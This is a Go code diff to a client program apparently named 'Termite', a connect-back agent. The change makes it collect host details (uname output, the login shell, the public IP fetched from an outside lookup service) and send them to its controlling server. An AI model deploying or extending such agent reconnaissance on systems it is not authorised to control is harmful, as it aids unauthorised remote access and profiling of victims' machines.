@@ -9,6 +9,7 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"os/user"
@@ -266,13 +267,44 @@ func handleConnection(c *client) {
 				interfaces[i.Name] = i.HardwareAddr.String()
 			}
 
+			// System version
+			cmd := exec.Command("uname", "-a")
+			output, err := cmd.Output()
+			if err != nil {
+				return
+			}
+			fmt.Println(string(output))
+			SystemInfo := strings.Trim(string(output), "\n")
+
+			// Shell
+			shell := os.Getenv("SHELL")
+			if shell == "" {
+				shell, err = exec.LookPath("sh")
+				if err != nil {
+					shell = ""
+				}
+			}
+
+			// OutIP
+			outIP := "127.0.0.1"
+			respCli, err := http.Get("https://myexternalip.com/raw")
+			if err == nil {
+				defer respCli.Body.Close()
+				body, _ := ioutil.ReadAll(respCli.Body)
+				outIP = string(body)
+			}
+
 			c.EncoderLock.Lock()
 			err = c.Encoder.Encode(message.Message{
 				Type: message.CLIENT_INFO,
 				Body: message.BodyClientInfo{
+					SystemInfo:        SystemInfo,
+					OS:                runtime.GOOS,
+					Arch:              runtime.GOARCH,
+					Shell:             shell,
+					OutIP:             outIP,
 					Version:           update.Version,
 					User:              username,
-					OS:                runtime.GOOS,
 					Python2:           python2,
 					Python3:           python3,
 					NetworkInterfaces: interfaces,
@@ -801,7 +833,7 @@ func main() {
 	for {
 		log.Info("Termite (v%s) starting...", update.Version)
 		if startClient(service) {
-			add := (int64(rand.Uint64()) % backoff.Current)
+			add := int64(rand.Uint64()) % backoff.Current
 			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
 			backoff.Sleep(add)
 		} else {
